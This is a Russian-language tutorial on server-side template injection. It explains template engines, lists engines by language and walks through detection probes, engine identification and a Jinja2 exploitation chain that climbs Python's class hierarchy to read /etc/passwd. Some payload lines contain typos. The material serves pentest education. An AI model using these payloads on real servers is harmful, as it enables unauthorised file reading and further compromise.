Server Side Template Injection – это уязвимость (то есть вид атаки на шаблонизаторы), при которой непосредственная вставка пользовательских данных в шаблон может спровоцировать критическую уязвимость в системе.

Template Injection может возникнуть, если пользовательские данные вставляются в шаблон без какой-либо валидации (или с плохой валидацией)

Веб-шаблон – это некоторый тематический html документ, который не является полноценной html страницей, а лишь оболочкой для каких-либо данных. Для ассоциативного ряда можно представить вебшаблон как бланк принятия посылки с почты. Бланк имеет общую структуру (графу ФИО, телефон, получатель, отправитель и так далее).Таких бланков много и все они одинаковые для каждого человека, который будет ее заполнять. Но каждый заполняет ее своими данными.

Шаблонизатор – это программное обеспечение, позволяющее использовать шаблоны для генерации конечных html-страниц. Другими словами, именно шаблонизатор занимается отделением представления конечного результата от исполняемого кода, который в свою очередь заполняет определенными данными шаблон 

|    Среда        | Описание                      
|----------------|-------------------------------|
|Java|Apache, Velocity, FreeMarker, Histone  |    
|PHP  |BH, Fenom, Smarty, Twig, TinyButStrong, XTemplate, Histone, Separate, Blade, Sigma, PHPTAL, Facebook, XHP, dwoo, Blitz, templates | 
|Python | Genshi, Kid, Jinja2, Mako |
|Perl|Template, Toolkit, HTML::Template|
|Ruby |Ruby, Erubis, Haml, Slim, Liquid |
|JS |bem-xjst, BH, Handlebars, Underscore, pug, Histone |


При тестировании веб приложения уязвимости SSTI следует
придерживаться следующего алгоритма:
- Обнаружение
- Идентификация
- Эксплуатация: Чтение --> Исследование --> Атака

 #### Обнаружение
 ```
{{5*6}}
${5*6}
<%= 5*6%>
${{5*6}}
#{5*6}
*{5*6}
```

#### Идентификация

- ${5*6}-->a{*comment*}b-->Smarty
- ${5*6}-->a{*comment*}b-->${"z".join("ab")}-->Mako,unknown
- ${5*6}-->{{5*6}}-->{{5*'6'}}-->jinja2,Twig
- ${5*6}-->{{5*6}}-->нет уязвимости
#### Эксплуатация (чтение)

В документации есть ключевые части, которые следует просмотреть с точки зрения эксплуатации уязвимости:
- Раздел «For Template Authors» описывает базовый синтаксис;
- «Security Considerations» - есть огромный шанс, что разработчики веб приложения не читали данный раздел;
- Список встроенных функций, методов и переменных;
- Список дополнений и расширений — некоторые из них могут быть включены по умолчанию.

#### Эксплуатация (Исследование)
Многие шаблонизаторы имеют объект «self», который предоставляет информацию обо всех других объектах и методах. Если же объекта self нет, то можно попробовать профаззить объекты с помощью инструментов Burp Suite или Wfuzz и словарей с готовыми полезными нагрузками (Seclists, FuzzDB)

#### Эксплуатация (Атака)

Допустим, было обнаружено веб приложение, уязвимое к SSTI. Также было обнаружено, что приложение использует шаблонизатор Jinja2. Тогда можно проэксплуатировать уязвимость следующим образом: например, добьемся чтения локального файла сервера. Так как шаблонизатор написан на Python, будем использовать функции mro и subclasses ().


### Суть SSTI заключается в том, чтобы использовать методы языка, на которых написан шаблонизатор, в своих целях.

Краткое описание классов, методов и атрибутов:
```
__class__ возвращает объект, которому принадлежит тип
__mro__ возвращает кортеж, содержащий базовые классы, унаследованные объектом, и метод анализируется в порядке кортежей во время синтаксического анализа.
__base__ возвращает базовый класс, унаследованный этим объектом
// __base__ и__mro__ используется для поиска базового класса.
__subclasses__ Каждый новый класс сохраняет ссылки на подклассы. Этот метод возвращает список ссылок, которые все еще доступны в классе.
__init__ метод инициализации класса
__globals__ Ссылка на словарь, содержащий глобальные переменные функции.
```
#### Атрибут __mro__ в Python позволяет «двигаться» по древу и наследовать вверх к суперклассу, а функция subclasses () позволяет «двигаться» вниз к наследникам. Таким образом, можно «выбраться» из одного класса и воспользоваться другим.
```
{''.__ class__}}
{{''.__class__.__mro__}}
{{''.__class__.__mro__[2]. Subclasses__()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```
